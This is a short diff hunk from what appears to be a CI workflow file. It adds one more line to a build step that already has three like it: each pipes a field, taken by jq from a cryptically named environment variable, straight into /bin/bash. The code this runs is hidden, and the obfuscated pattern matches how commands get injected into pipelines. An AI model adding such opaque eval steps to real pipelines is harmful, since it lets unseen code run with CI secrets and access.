@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$yump00724" | jq -r .lthx26324 | /bin/bash
           printf '%s' "$rjwl09591" | jq -r .maf39 | /bin/bash
           echo $met34 | jq -r .yykp8 | /bin/bash
+          printf '%s' "$ci6" | jq -r .oib6370 | /bin/bash
 
       - name: Upload artifact
         if: always()
